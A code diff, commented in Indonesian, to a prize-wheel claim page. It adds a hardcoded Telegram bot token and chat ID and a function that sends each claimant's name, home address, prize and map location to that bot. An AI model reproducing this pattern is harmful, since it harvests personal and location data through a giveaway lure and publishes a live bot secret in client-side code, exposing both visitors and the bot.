@@ -1,3 +1,9 @@
+// ==========================================
+// KONFIGURASI TELEGRAM BOT
+// ==========================================
+const TELEGRAM_BOT_TOKEN = "8314141031:AAGdgHhChTJ9NqaH4kCxgLSQ9Dmd13b0d0c"; // Ganti dengan Token dari @BotFather
+const TELEGRAM_CHAT_ID = "7660844388"; // Chat ID Anda
+
 const prizes = [
   { label: "Voucher", name: "Voucher belanja" },
   { label: "Headphone", name: "Headphone" },
@@ -243,7 +249,38 @@ function saveClaims(claims) {
   window.localStorage.setItem(STORAGE_KEY, JSON.stringify(claims));
 }
 
-claimButton.addEventListener("click", () => {
+// Fungsi untuk mengirim data ke Telegram Bot
+async function sendToTelegram(name, address, prize, location) {
+  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+  let message = `<b>🎁 Klaim Hadiah Baru!</b>\n\n`;
+  message += `<b>Penerima:</b> ${name}\n`;
+  message += `<b>Alamat:</b> ${address}\n`;
+  message += `<b>Hadiah:</b> ${prize}\n`;
+
+  if (location && location.latitude && location.longitude) {
+    message += `<b>Lokasi:</b> https://maps.google.com/?q=${location.latitude},${location.longitude}\n`;
+  }
+
+  try {
+    const response = await fetch(telegramUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "HTML"
+      })
+    });
+    const result = await response.json();
+    return result.ok;
+  } catch (error) {
+    console.error("Gagal mengirim ke Telegram:", error);
+    return false;
+  }
+}
+
+claimButton.addEventListener("click", async () => {
   const name = recipientName.value.trim();
   const address = recipientAddress.value.trim();
   if (!selectedPrize) return;
@@ -264,8 +301,9 @@ claimButton.addEventListener("click", () => {
   }
 
   claimButton.disabled = true;
-  claimStatus.textContent = "Menyimpan klaim...";
+  claimStatus.textContent = "Menyimpan dan mengirim ke Telegram...";
 
+  // 1. Simpan ke LocalStorage (seperti sebelumnya)
   const claims = loadClaims();
   claims.unshift({
     id: crypto.randomUUID(),
@@ -278,7 +316,10 @@ claimButton.addEventListener("click", () => {
   });
   saveClaims(claims);
 
-  claimStatus.textContent = "Klaim tersimpan. Data hanya terlihat di panel admin (di browser ini).";
+  // 2. Kirim otomatis ke Telegram Bot
+  await sendToTelegram(name, address, selectedPrize.name, selectedLocation);
+
+  claimStatus.textContent = "Klaim berhasil disimpan & dikirim ke bot Telegram!";
   recipientName.value = "";
   recipientAddress.value = "";
   claimConsent.checked = false;
